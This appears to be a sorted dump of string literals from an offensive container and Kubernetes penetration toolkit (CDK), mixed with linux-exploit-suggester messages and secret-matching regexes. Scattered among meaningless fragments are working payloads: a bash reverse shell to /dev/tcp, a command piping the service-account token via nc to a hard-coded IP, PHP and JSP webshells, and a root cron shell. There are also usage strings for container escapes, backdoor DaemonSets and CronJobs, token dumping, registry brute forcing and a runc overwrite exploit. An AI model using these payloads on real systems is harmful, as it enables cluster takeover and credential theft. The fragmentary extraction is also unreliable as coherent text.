"""2020-09-10T07:23:24Z"
"""2020-09-10T07:23:25Z"
"""2020-09-10T07:23:26Z"
"""2020-09-10T07:23:27Z"
"""2020-09-10T07:23:38Z"
"""2020-09-10T07:23:39Z"
"""2020-09-10T07:23:40Z"
"""2020-09-10T07:23:41Z"
"""2020-09-10T07:23:44Z"
"""2020-09-10T07:23:45Z"
"""2020-09-10T07:23:49Z"
"""2056"
"""2084"
"""2116"
"""2135"
"""215494bd-3a58-4697-9f30-c0e31f104830"
"""22"
"""2375"
"""2379"
"""250m"
"""252c322a-a5ed-47b2-a993-f11f3c6e6ba9"
"""256Mi"
"""2db5e97f-8bc3-480b-abf9-2483180990e2"
"""3"
"""30"
"""30000"
"""30001-32767"
"""35736324"
"""35736340"
"""35736383"
"""35736387"
"""35736395"
"""35736400"
"""35736431"
"""35736460"
"""386 amd64 arm arm64 mips mips64 mips64le mipsle"
"""39813f36-d2af-44e6-950e-3a6accc5575b"
"""3aa03e33-6a94-4dba-882a-b1319315f437"
"""3fffffffff"
"""4"
"""4194"
"""42c625ba-2454-45b2-9ab4-e658bf9ee760"
"""44134"
"""443"
"""487"
"""4Gi"
"""4f2f3156-b2c5-4b32-9105-d1a97ab86d7e"
"""500Mi"
"""500m"
"""50Mi"
"""50m"
"""54575fbd57"
"""5495b9fccf"
"""5599ddcdc7"
"""58cf7e8a-6da3-46ba-ac47-bc35e6c16eea"
"""59bf758d55"
"""5d9fd8ccf4"
"""61e7f14f-8a16-449f-9e51-c71d0e9f9e9a"
"""6443"
"""645"
"""64714155"
"""648fd8d160a03f8f137f14d7f47fad87"
"""64c74234-7ad3-42a7-9152-8985d3dda2f5"
"""6775794f84"
"""68999d69df"
"""6ad1ec0f-9434-44d0-8edf-db17d0e6c641"
"""6b4f98fdfb"
"""70Mi"
"""70b7a644-8470-4500-9408-50e20a4a0bc5"
"""74b658598f"
"""764074df-9a67-44e6-a337-c245d51d785d"
"""7b681bd4-c3f8-4d8f-81ef-914b39f6af3e"
"""7d9bdff4f"
"""7eb1d60b-0e68-4ae0-8554-5f9c4e52f2bd"
"""80"
"""800"
"""8001"
"""8080"
"""80Mi"
"""81252af1-d0c2-43ef-9b00-f669a68cee9e"
"""814"
"""8443"
"""8494d5b47"
"""87535eb7-8b07-47b2-a9db-7d5b31935e45"
"""8Gi"
"""8a03af3b-50aa-4e89-a0c6-b40dabf52220"
"""8d75401f-617c-40e9-a026-25418af036ff"
"""8ef35ac0-0b9a-407c-a4f3-8e18c597a0c3"
"""901c27fa-7b97-4938-920c-91d8f588aae7"
"""914"
"""915"
"""9153"
"""93add848-e132-43d0-bb85-0d953778e46c"
"""9:devices:/docker/fc1413683c2976fa292c0b1e011224706c1ecc151bad9ceabc9cfcb8dce4ddbb"
"""9a367f62-0ab7-4177-831f-96a86e042674"
""":                       "
""":                  "
""":                 "
""":                "
""":               "
""":              "
""":             "
""":            "
""":           "
""":          "
""":         "
""":        "
""":       "
""":      "
""":    "
""":  ["
""": "
""": ["
""": \"
""": a valid label must be an empty string or consist of alphanumeric characters, '-', '_' or '.', and must start and end with an alphanumeric character (e.g. 'MyValue',  or 'my_value',  or '12345', regex used for validation is '(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?')"
""":"
""":.*?"
""":0,"
""":1,"
""":10,"
""":100,"
""":1000,"
""":101}}],"
""":10251,"
""":10252,"
""":10254,"
""":15,"
""":2,"
""":2000000000,"
""":2000001000,"
""":255,"
""":30,"
""":300},{"
""":300}],"
""":3},"
""":420}},{"
""":420}}],"
""":443,"
""":443},"
""":5,"
""":53,"
""":5},"
""":60,"
""":6443"
""":6443,"
""":80,"
""":8080,"
""":8181,"
""":8},"
""":9153,"
""":["
""":[{"
""":[{\"
""":\"
""":\\s*?\"
""":false,"
""":false}}],"
""":null,"
""":true,"
""":true}"
""":true},"
""":true}],"
""":true}]},"
""":true}}],"
""":{"
""":{\"
""":{},"
""":{},\"
"""<"
"""<%Runtime.getRuntime().exec(request.getParameter(\"
"""<="
"""<?php @eval($_POST['$SECRET_PARAM']);?>"
"""<SHELL_CMD>"
"""<args>"
"""<cmd>"
"""<exploit>"
"""<shell-payload>\"
"""<tool>"
"""="
"""=="
""">"
""">="
""">=v1.16"
"""@"
"""@/containerd-shim/.*\\.sock"
"""ACS_CPFS"
"""ACS_DISK"
"""ACS_NAS"
"""ACS_OSS"
"""AKIA99999999999999AB"
"""AKIA[A-Z0-9]{16}"
"""ALL"
"""APIGroupList"
"""AS IS"
"""ASLR is disabled."
"""ASLR is enabled."
"""AUDIT_CONTROL"
"""AWS API Key"
"""Aborting."
"""Accept failed: %s"
"""Account: %s:%s is available.\n"
"""Additional checks (CONFIG_*, sysctl entries, custom Bash commands): $([ "
"""Alibaba Cloud"
"""Always"
"""Amazon Web Services (AWS)"
"""Architecture: $([ -n "
"""AttachStderr"
"""AttachStdin"
"""AttachStdout"
"""Attack Cloud Native Kubernetes"
"""Attack the kubelet endpoint."
"""Authorization"
"""Authorization: Bearer xxx"
"""Azure"
"""Basic %s"
"""Bearer "
"""BestEffort"
"""Bidirectional"
"""Binds"
"""Blockdevice Marjor/Minor number invalid."
"""Burstable"
"""CAP_AUDIT_CONTROL"
"""CAP_AUDIT_READ"
"""CAP_AUDIT_WRITE"
"""CAP_BLOCK_SUSPEND"
"""CAP_BPF"
"""CAP_CHECKPOINT_RESTORE"
"""CAP_CHOWN"
"""CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP"
"""CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_SYS_ADMIN,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP"
"""CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_SYS_PTRACE,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP"
"""CAP_DAC_OVERRIDE"
"""CAP_DAC_READ_SEARCH"
"""CAP_FOWNER"
"""CAP_FSETID"
"""CAP_IPC_LOCK"
"""CAP_IPC_OWNER"
"""CAP_KILL"
"""CAP_LEASE"
"""CAP_LINUX_IMMUTABLE"
"""CAP_MAC_ADMIN"
"""CAP_MAC_OVERRIDE"
"""CAP_MKNOD"
"""CAP_NET_ADMIN"
"""CAP_NET_BIND_SERVICE"
"""CAP_NET_BROADCAST"
"""CAP_NET_RAW"
"""CAP_PERFMON"
"""CAP_SETFCAP"
"""CAP_SETGID"
"""CAP_SETPCAP"
"""CAP_SETUID"
"""CAP_SYSLOG"
"""CAP_SYS_ADMIN"
"""CAP_SYS_BOOT"
"""CAP_SYS_CHROOT"
"""CAP_SYS_MODULE"
"""CAP_SYS_NICE"
"""CAP_SYS_PACCT"
"""CAP_SYS_PTRACE"
"""CAP_SYS_RAWIO"
"""CAP_SYS_RESOURCE"
"""CAP_SYS_TIME"
"""CAP_SYS_TTY_CONFIG"
"""CAP_WAKE_ALARM"
"""CDK Version(GitCommit):"
"""CMD"
"""CONFIG_"
"""CVE: $cve"
"""Cannot find kube-apiserver pod in namespace:kube-system, maybe target K8s master node managed by cloud provider, cannot deploy api-server in this environment."
"""Cannot find vulnerable containerd-shim socket."
"""Cap"
"""CapHexParser error parse %s: %s"
"""CapHexParser error: %s"
"""Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):"
"""Caution: Flag auto-escape is deprecated as of CDK v1.5.1, and will be archived in v2.0. We recommend migrating to `./cdk eva --full` and `./cdk run`."
"""Check was the shell in a istio(service mesh) network, please note that this feature will request http://httpbin.org/get. Usage: cdk run istio-check."
"""Checking requirement: $1"
"""Closed: %s"
"""ClusterFirst"
"""ClusterIP"
"""Comments: "
"""Completed"
"""Connect to etcd and get token of k8s. "
"""Connection received : %s"
"""Connection received: %s"
"""Connection"
"""Containers"
"""ContainersReady"
"""ContainersRunning"
"""Content-Type"
"""Contribution"
"""Contributor"
"""Corefile"
"""Create and run <cmd> in a container with host `/` mounted to `/host`. usage: ./cdk run docker-api-pwn http://127.0.0.1:2375 \"
"""Create and run <cmd> in a container with host root `/` mounted to container `/host` usage: ./cdk run docker-sock-deploy <sock_path> <shell_cmd> example: ./cdk run docker-sock-pwn /var/run/docker.sock \"
"""Critical - Possible Privileged Container Found."
"""Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'."
"""CronJob"
"""DaemonSet"
"""Dail failed: %s"
"""Default"
"""Deployment"
"""Derivative Works"
"""Dialed host: %s://%s"
"""Directory"
"""DirectoryOrCreate"
"""Disabled"
"""Discovery - Cloud Provider Metadata API"
"""Discovery - K8s API Server"
"""Discovery - K8s Service Account"
"""Distribution version: $([ -n "
"""Distribution: $([ -n "
"""Docker API response:"
"""Domainname"
"""Dump K8S Pod Security Policies and try, usage: cdk run k8s-psp-dump (auto|<service-account-token-path>)"
"""Dump target service-account token and send it to remote ip:port, usage: cdk run k8s-get-sa-token (default|anonymous|<service-account-token-path>) <target-service-account> <ip> <port>"
"""Enabled"
"""End!"
"""Entrypoint"
"""Error"
"""Escape container in different ways then let target execute <cmd>."
"""Evaluate:"
"""Example: cdk run etcd-get-k8s-token anonymous http://172.16.61.10:2379"
"""Example: cdk run kubelet-exec exec https://172.16.61.10:10250/kube-system/test1/test \"
"""Example: cdk run kubelet-exec list http://172.16.61.10:10250"
"""Execute Result: \n\n %s \n"
"""Execute Shell:%s failed with error:%s"
"""Execute Shell:%s failed"
"""Execute Shell:%s finished with output:\n%s"
"""Exists"
"""Exited"
"""Exploit CVE-2019-5736 with shellcode commands: "
"""Exploit CVE-2020-8554: Man in the middle using ExternalIPs, usage: cdk run k8s-mitm-clusterip (default|anonymous|<service-account-token-path>) <image> <ip> <port>"
"""Exploit Pre - Kernel Exploits"
"""Exploit container escape with kubelet log access & /var/log mount."
"""Exploit:"
"""Exposed"
"""Facebook Oauth"
"""Failed read: %s"
"""FieldValueInvalid"
"""File"
"""FileOrCreate"
"""Find mounted lxcfs with rw flags, run `%s` or `%s` to escape container!\n"
"""Finished."
"""Flag --insecure-port has been deprecated, This flag has no effect now and will be removed in v1.24."
"""Found hostpath: "
"""GET"
"""GOTRACEBACK"
"""Generic API Key"
"""Generic Secret"
"""GetLocalAddresses"
"""GitHub"
"""Google (GCP) Service-account"
"""Google Cloud"
"""Google Oauth"
"""Guaranteed"
"""HOSTNAME=b6cee9b57f3b"
"""HTTP Request failed."
"""HTTP"
"""HTTPS"
"""Heroku API Key"
"""HostConfig"
"""Hostname"
"""ID"
"""If there is one argument, the first argument is the target file to read. "
"""IfNotPresent"
"""Image"
"""In"
"""Information Gathering - ASLR"
"""Information Gathering - Cgroups"
"""Information Gathering - Commands and Capabilities"
"""Information Gathering - DNS-Based Service Discovery"
"""Information Gathering - Mounts"
"""Information Gathering - Net Namespace"
"""Information Gathering - Sensitive Files"
"""Information Gathering - Services"
"""Information Gathering - Sysctl Variables"
"""Information Gathering - System Info"
"""Initialized"
"""Invalid Docker Remote API: "
"""Invalid IP Range (eg. 1.1.1.1-3)\n"
"""Invalid Input Args."
"""Invalid input args"
"""Invalid input args. (subsystem OR cmd not quoted)"
"""Invalid input args."
"""Invalid value: \"
"""Invalid"
"""K8S Pod Security Policies rule list:"
"""KUBERNETES_SERVICE_HOST"
"""KUBERNETES_SERVICE_PORT"
"""Kernel version: ${txtgrn}$KERNEL${txtrst}"
"""Kernel version: ${txtred}N/A${txtrst}"
"""LES ver. $VERSION (https://github.com/mzet-/linux-exploit-suggester) by @_mzet_"
"""Legal Entity"
"""License"
"""Licensor"
"""Link"
"""Listen failed: %s"
"""Listening on: %s://%s"
"""Locked"
"""MKNOD"
"""N/A"
"""NET_ADMIN"
"""NET_BIND_SERVICE"
"""NET_RAW"
"""NODE_NAME"
"""NOTICE"
"""No Pods were obtained."
"""NoExecute"
"""NoSchedule"
"""Not a Contribution."
"""NotIn"
"""Notice to choose anonymous|default (need CA Cert). "
"""Object"
"""OnFailure"
"""OpenStack"
"""OpenStdin"
"""Options:"
"""PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
"""PGP private key block"
"""POD_NAME"
"""POD_NAMESPACE"
"""POST"
"""Package listing: $([ -n "
"""Password in URL"
"""Pod"
"""PodList"
"""PodScheduled"
"""Pod\"
"""Provided CVE list file does not exists. Aborting."
"""RHEL"
"""RSA private key"
"""Ran {0.command!r} on {0.connection.host}, got stdout:\n{0.stdout}"
"""Read files from host or chroot to host and spawn a cmd. "
"""Ready"
"""ReplicaSet"
"""Reqs: "
"""Request Body: "
"""Running with target: %v, ref: %v\n"
"""Running"
"""SETFCAP"
"""SK[a-z0-9]{32}"
"""SKaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
"""SSH (DSA) private key"
"""SSH (EC) private key"
"""SSH (OPENSSH) private key"
"""SYS_ADMIN"
"""SYS_PTRACE capability was disabled."
"""SYS_PTRACE capability was enabled."
"""SYS_PTRACE"
"""Script needs Bash in version 4.0 or newer. Aborting."
"""Sec-Websocket-Key"
"""Sec-Websocket-Version"
"""Service"
"""Setuid files found:"
"""Shellcode will be trigger when an execve() call in container or the container is manually stopped."
"""Slack Token"
"""Slack Webhook"
"""Source"
"""Stack Clash"
"""Status"
"""Stdin stat failed: %s"
"""StdinOnce"
"""Successfully got write handle"
"""Support anonymous access or token designation."
"""Switches -f|--full and -g|--short are mutually exclusive. Aborting."
"""Switches -k|--kernel and --checksec are mutually exclusive. Aborting."
"""Switches -k|--kernel and --cvelist-file are mutually exclusive. Aborting."
"""Switches -p|--pkglist-file and --checksec are mutually exclusive. Aborting."
"""Switches -p|--pkglist-file and --cvelist-file are mutually exclusive. Aborting."
"""Switches -u|--uname and --checksec are mutually exclusive. Aborting."
"""Switches -u|--uname and --cvelist-file are mutually exclusive. Aborting."
"""Switches -u|--uname and -k|--kernel are mutually exclusive. Aborting."
"""TCP"
"""TERM=xterm"
"""THIS EXPLOIT WILL OVERWRITE RUNC BINARY AND BREAK CI/CD, BACKUP YOUR RUNC BINARY FIRST!"
"""TYPE \t NAME \t DESC"
"""Tencent Cloud"
"""TestBlankInString"
"""That should be equal"
"""The First argument is file bind-mounted to container from host (default: %s), "
"""The command executed is"
"""To container image registry, brute force the accounts and passwords cracking. Usage: ./cdk registry-brute <registry-url> <username|file> <password|file>. Example: ./cdk registry-brute https://index.docker.io/ root,admin /tmp/passwordfile."
"""Token authentication failed!"
"""Tool:"
"""Trigger Release Error: %s \n"
"""True"
"""Trying to create a pod to dump service-account:%s token to remote server %s:%s\n"
"""Tty"
"""Twilio API Key"
"""Twitter Oauth"
"""UDP"
"""Unix HTTP Request failed."
"""Unknown option '$1'. Aborting."
"""Unrecognized kernel version given. Aborting."
"""Upgrade"
"""Upload cdk binary to K8s failed.\nCMD: "
"""Upload cdk binary to self-build k8s failed.\nCMD: "
"""Usage: ./cdk vi <file_name>\n"
"""Usage: cdk run etcd-get-k8s-token (anonymous|default) <endpoint> <cert> <cert_key> <ca>"
"""Usage: cdk run k8s-kubelet-var-log-escape /root/targetfile-to-read"
"""Usage: cdk run kubelet-exec (list|exec) <endpoint>/<namespace>/<pod>/<container> <token>"
"""Usage: linux-exploit-suggester.sh [OPTIONS]"
"""Usage:"
"""Use local token:"
"""User"
"""User-Defined Shell Payload: %s \n"
"""Volumes"
"""WARNING. Kernel Config not found on the system results won't be complete."
"""When second argument is \"
"""Work"
"""Write PID to cgroup.procs failed: %s \n"
"""Write webshell to target path. Usage: cdk run webshell-deploy (php|jsp) <filepath>."
"""Wrong sysctl condition. There is syntax error in your features DB. Aborting."
"""X-Amzn-Trace-Id"
"""X-B3-Sampled"
"""X-B3-Spanid"
"""X-B3-Traceid"
"""X-Envoy-Attempt-Count"
"""X-Envoy-Peer-Metadata is %s.\n"
"""X-Envoy-Peer-Metadata"
"""X-Envoy-Peer-Metadata-Id is %s.\n"
"""X-Envoy-Peer-Metadata-Id"
"""X-Forwarded-For"
"""You are using the thin version. In order to be more lightweight, this tool is not included in the thin version."
"""You may be able to access the localhost service of the current container node or other nodes."
"""You"
"""Your"
"""[   ${txtgray}N/A${txtrst}    ]"
"""[ ${txtgray}Unknown${txtrst}  ]"
"""[ ${txtgrn}Enabled${txtrst}   ]"
"""[ ${txtgrn}Enabled${txtrst}  ]"
"""[ ${txtgrn}Locked${txtrst}   ]"
"""[ ${txtgrn}Set to $cmdStdout${txtrst} ]"
"""[ ${txtred}Disabled${txtrst} ]"
"""[ ${txtred}Exposed${txtrst}  ]"
"""[ ${txtred}Set to $cmdStdout${txtrst} ]"
"""[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation."
"""[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/."
"""[%s] %s"
"""[*] Maybe you can exploit the Capabilities below:\n"
"""[+] $NAME"
"""[+] %s\n"
"""[+] Args: %v.\n"
"""[+] Checking kubelet endpoint: %s"
"""[+] Found /var/log mount success, mount point: %s"
"""[+] Get log file success, file content: \n%s"
"""[+] Running exploit: %s.\n"
"""[+] You can write the host file '%s' in file path: %s"
"""[+] kubelet log access success, url: %s, response length: %d"
"""[+] run ifconfig, using GetLocalAddresses()"
"""[+] run netstat, using RunNestat()"
"""[-] Chroot: %v\n"
"""[-] Fchdir: %v\n"
"""[-] Get log file error: %v"
"""[-] GetGateway error: %v"
"""[-] GetMountInfo error: %v"
"""[-] Not found /var/log mount"
"""[-] Open: %v\n"
"""[-] OpenByHandleAt: %v\n"
"""[-] Please provide a payload"
"""[-] Run cmd: %s\n"
"""[-] capability.CapHexParser: %v\n"
"""[-] kubelet log access error: %v"
"""[-] read file: %s\n"
"""[A-Fa-f0-9]{64}"
"""[CVE"
"""[DEBUG] "
"""[ERROR] "
"""[INFO_]  "
"""[WARN_]  "
"""[\s\:]*?\[[^\]]*?"
"""[]"
"""[a-zA-Z0-9-_]{24}\"
"""[a-zA-Z]{3,10}://[^/\\s:@]{3,20}:[^/\\s:@]{3,20}@.{1,100}[\"
"""[a|A][p|P][i|I][_]?[k|K][e|E][y|Y].{0,30}['\"
"""[etcd-get-k8s-token] There are %d pods in kube-system namespace."
"""[etcd-get-token] run failed:"
"""[f|F][a|A][c|C][e|E][b|B][o|O][o|O][k|K].{0,30}['\"
"""[g|G][i|I][t|T][h|H][u|U][b|B].{0,30}['\"
"""[h|H][e|E][r|R][o|O][k|K][u|U].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}"
"""[s|S][e|E][c|C][r|R][e|E][t|T].{0,30}['\"
"""[test] ping -> pong\n"
"""[t|T][w|W][i|I][t|T][t|T][e|E][r|R].{0,30}['\"
"""\"
"""\[CVE"
"""\\\"
"""\\n"
"""\\s]"
"""\\s][0-9a-f]{32}['\"
"""\\s][0-9a-zA-Z]{32,45}['\"
"""\\s][0-9a-zA-Z]{35,40}['\"
"""\\s][0-9a-zA-Z]{35,44}['\"
"""\\t"
"""\e[0;31m"
"""\e[0;36m"
"""\e[0;37m"
"""\e[0m"
"""\e[1;32m"
"""\e[91;1m"
"""\n   Details: $details"
"""\n"
"""\n%-80s\t%-10s\n"
"""\n%s\n* * * * * root %s"
"""\n%s\n* * * * * root %s\"
"""\nClosed udp listen"
"""\nInvalid script name: %s , available scripts:\n"
"""\nOutput:\n"
"""\n[  "
"""\n[Auto Escape - Deploy K8s Backdoor Daemonset]\n"
"""\n[Auto Escape - K8s API Server]\n"
"""\n[Auto Escape - Privileged Container]\n"
"""\n[Auto Escape - Shared Net Namespace]\n"
"""\n[Auto Escape - docker.sock]\n"
"""\n[Information Gathering - Cgroups]\n"
"""\n[Information Gathering - SIDs]\n"
"""\n[Information Gathering - System Info]\n"
"""\n[test] run success\n"
"""\nfound %s in: %s\n%s\n"
"""\nsysctl -w fs.file-max=1048576\nsysctl -w fs.inotify.max_user_instances=16384\nsysctl -w fs.inotify.max_user_watches=524288\nsysctl -w fs.inotify.max_queued_events=16384\n"
"""\t"
"""\t%s - %s\n"
"""\t%s Metadata API available in %s\n"
"""\t%s webshell saved in %s\n\tsend codes or system command via post param: %s=(codes)\n"
"""\t%s\n"
"""\tAdded capability list: %s\n"
"""\tCap decode: 0x%s = %s\n"
"""\tDocs: %s\n"
"""\tFind K8s api-server in ENV:"
"""\tapi-server forbids anonymous request."
"""\tcannot find RunC process inside container, exit."
"""\tcongrats, api-server allows anonymous request."
"""\tcontainer net namespace isolated."
"""\tfailed"
"""\tfailed."
"""\tfound containerd-shim socket in: %s\n"
"""\thost unix-socket found, seems container started with --net=host privilege."
"""\tlistening port: https://%s:9444\n"
"""\tmatched pid - "
"""\tnow you can make your own request to takeover the entire k8s cluster with `./cdk kcurl` command\n\tgood luck and have fun."
"""\tresponse:"
"""\trun: kubectl --server=https://%s:9444 --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"
"""\trun: kubectl --server=https://%s:9444 --token=%s --kubeconfig=/dev/null --insecure-skip-tls-verify=true get pods -A\n"
"""\tservice-account is available"
"""\tservice-account is not available"
"""\tshadow api-server pod name:%s, namespace:%s, node name:%s\n"
"""\tsuccess, the service-account have a high authority."
"""\tsuccess, the system:anonymous role have a high authority."
"""\x00"
"""]*?"
"""]*?)"
"""]*?)("
"""]*?)(,\s*?"
"""],"
"""]},"
"""]}]},"
"""]}]}]}},"
"""]}]}]}}},"
"""]}}}],"
"""^$pkgName-[0-9]+"
"""^\-\-$"
"""`uname -r`"
"""a *:* rwm"
"""a"
"""a5b5c25d-922a-4499-b2ae-dad9f083aad8"
"""a\"
"""abcde1fghij2klmno3pqrst4uvwxy5zABCD6EFGHI7JKLMN8OPQRS9TUVWX9YZ"
"""abuse mount-cgroup co-operating with unprivileged user namespace creation. usage: ./cdk run abuse-unpriv-userns \"
"""abuse-unpriv-userns"
"""access"
"""ack.privileged"
"""acs-flexvolume"
"""add"
"""admin"
"""admin-token-t8m2n"
"""affinity"
"""agent"
"""ak-leakage"
"""alicloud-application-controller"
"""alicloud-application-controller-68999d69df"
"""alicloud-application-controller-68999d69df-"
"""alicloud-application-controller-68999d69df-6fbgg"
"""alicloud-disk-controller"
"""alicloud-disk-controller-74b658598f"
"""alicloud-disk-controller-74b658598f-"
"""alicloud-disk-controller-74b658598f-rrztt"
"""alicloud-monitor-controller"
"""alicloud-monitor-controller-5599ddcdc7"
"""alicloud-monitor-controller-5599ddcdc7-"
"""alicloud-monitor-controller-5599ddcdc7-8btss"
"""aliyun"
"""aliyun-acr-credential-helper"
"""aliyun-acr-credential-helper-6b4f98fdfb"
"""aliyun-acr-credential-helper-6b4f98fdfb-"
"""aliyun-acr-credential-helper-6b4f98fdfb-ndzlt"
"""aliyun-acr-credential-helper-token-jlc5m"
"""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4"
"""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_jsonfile"
"""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_product"
"""aliyun_logs_audit-ca3869bd4dd884799a5abbb00c5e56fc4_tags"
"""all exploits are finished, auto exploit failed."
"""all exploits are finished, auto exploit success!"
"""all"
"""allow"
"""allowPrivilegeEscalation"
"""alpine"
"""alpine:latest"
"""amd64"
"""analysis-url: "
"""annotations"
"""annotations,omitempty"
"""annotations\"
"""anonymous"
"""any strings"
"""any.any.any.svc.cluster.local."
"""any.any.svc.cluster.local."
"""apache"
"""apache2"
"""api-server response in deployPod:"
"""api-server response in dumpPodConfig:"
"""api-server response:"
"""apiVersion"
"""apiVersion\"
"""app"
"""application/json"
"""apps/v1"
"""apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc ${RHOST} ${RPORT}; sleep 300"
"""apt update && apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc 39.104.80.49 999; sleep 99999999"
"""apt update \u0026\u0026 apt install -y netcat; cat /run/secrets/kubernetes.io/serviceaccount/token | nc $RHOST $RPORT; sleep 300"
"""apt"
"""arch"
"""args"
"""audit-policy"
"""audit=apiserver"
"""author: "
"""authorize success"
"""auto"
"""auto-escape"
"""automountServiceAccountToken"
"""availability_zone"
"""available commands:\n\t%s\n"
"""azEnvironment"
"""b5587527-5e4e-45d9-83cf-842b38c4150b"
"""b6cee9b57f3b"
"""b7564d4e-3bb1-48ef-8885-3984be70f46d"
"""b75d504c-7153-4083-bce2-df1b4b55b391"
"""base64 decode failed:"
"""base64"
"""bash -i >& /dev/tcp/%s/%s 0>&1"
"""bash"
"""batch/v1beta1"
"""bb29477b-80e5-409c-a4ed-39dfb36a588f"
"""beta.kubernetes.io/arch"
"""beta.kubernetes.io/os"
"""bf56a35b-0478-4684-8391-0ff7fdc9cb69"
"""bfc484779"
"""bin-url: "
"""blockIO"
"""blockOwnerDeletion"
"""bufio"
"""build constraints exclude all Go files in /pkg/task"
"""bytes"
"""c50a4e85-b1de-41af-b9f5-59d5ee5f68f9"
"""c61634a1-bf3b-4aa5-b5fb-f0ad51142c48"
"""cAdvisor"
"""ca-certs"
"""can not find host path\n"
"""cannot create mountpoint"
"""cannot create subgroup :%s"
"""cannot decode JSON: %v"
"""cannot determine cgroup version"
"""cannot enable notify_on_release %s"
"""cannot enable notify_on_release"
"""cannot fetch http://httpbin.org/get , get err: %v"
"""cannot find suitable subsystem for exploit"
"""cannot get cgroup info"
"""cannot get current executable path"
"""cannot get docker daemon info from target unix socket."
"""cannot run `fdisk` command on target os"
"""cap-dac-read-search"
"""capabilities"
"""capsh"
"""cat ${KBUILD_OUTPUT:-/usr/src/linux}/.config"
"""cat /boot/config-` + "
"""causes"
"""cc5cdba3-2cf6-404d-aaea-cf133ae90ec9"
"""cdk evaluate"
"""cdk run lxcfs-rw"
"""cdk run lxcfs-rw-cgroup"
"""cdk-backdoor-cronjob"
"""cdk-backdoor-cronjob-container"
"""cdk-backdoor-daemonset"
"""cdk-backdoor-pod"
"""cdk-fuzz-psp"
"""cdk-rbac-bypass-create-pod"
"""cdk-var-log-escape"
"""cdk_"
"""cdk_dcgroup"
"""cdktest"
"""cdxy-test-2021"
"""cdxy-test-2021\"
"""ce808e7969c6fd3d9ec44e79813ec9c1"
"""ce995e51-9bd8-4a76-ad70-50c75f70017c"
"""certificate-authority-data"
"""certs"
"""cf48a7f1-93f4-42f6-900b-aecf853279e5"
"""cgroup"
"""cgroup/"
"""cgroup/devices"
"""check cdk banner in .go"
"""check cdk banner in github wiki"
"""check cdk banner in readme.md"
"""check cdk version"
"""check if docker unix socket available. usage: ./cdk run docker-sock-check <sock_path>"
"""check if pid injection works with cap=SYS_PTRACE. usage: ./cdk run check-ptrace"
"""check prerequisites error."
"""check run ok, timeout in 2s, and return."
"""check-ptrace"
"""checking docker socket: "
"""checking docker socket:"
"""checking if api-server allows system:anonymous request."
"""chown"
"""client-certificate-data"
"""client-key-data"
"""client.Do error: %v\n"
"""client_secret\"
"""close exec fds: open /proc/self/fd"
"""cloud-config"
"""cloud-config.conf"
"""cloud-controller-manager"
"""cloud-controller-manager-"
"""cloud-controller-manager-grvn8"
"""cloud-controller-manager-rpc6j"
"""cloud-controller-manager-stdpv"
"""cloud-controller-manager-token-hrbpn"
"""cluster"
"""clusters"
"""cmd.exe"
"""cn-beijing.192.168.0.150"
"""cn-beijing.192.168.0.151"
"""cn-beijing.192.168.0.152"
"""cn-beijing.192.168.0.153"
"""cn-beijing.192.168.0.154"
"""cn-beijing.192.168.0.155"
"""cni"
"""code"
"""command"
"""command,omitempty"
"""component"
"""conditions"
"""config-volume"
"""configMap"
"""container ID: "
"""container escape via CVE-2019-5736. usage: ./cdk run runc-pwn <shell-cmd>"
"""container filesystem path on host cannot be found"
"""container"
"""containerID"
"""containerPort"
"""containerStatuses"
"""container\"
"""containers"
"""containers\"
"""context"
"""contexts"
"""control"
"""control-plane"
"""controller"
"""controller-revision-hash"
"""convert major number to int64 err: %v\n"
"""convert minor number to int64 err: %v\n"
"""coredns"
"""coredns-8494d5b47"
"""coredns-8494d5b47-"
"""coredns-8494d5b47-8clp4"
"""coredns-8494d5b47-gllw6"
"""coredns-token-d79rf"
"""cpu"
"""crash"
"""create cronjob with user specified image and cmd. Usage: cdk run k8s-cronjob (default|anonymous|<token-path>) (min|hour|day|<cron-expr>) <image> <args>"
"""creationTimestamp"
"""creationTimestamp,omitempty"
"""credential-access"
"""crypto/tls"
"""crypto/x509"
"""curl"
"""current cgroup for exploit: %s \n"
"""current dir:"
"""current docker abs path:\n%s\n"
"""current user"
"""current user:"
"""current-context"
"""cwd"
"""d3540caa-ffc9-49ed-bac3-582d8444954c"
"""d9eead21-3360-481f-ad44-f546c22733cc"
"""dashboard"
"""day"
"""dcaaaa8b-d304-42a3-8ee2-2d415041c6c0"
"""dcurl"
"""de9e98a0-2c72-4ef3-81d1-22e8afa38846"
"""debian"
"""debugfs -w host_dev\"
"""deepin"
"""default"
"""default-scheduler"
"""default-token-cmtwb"
"""defaultMode"
"""default\"
"""deny"
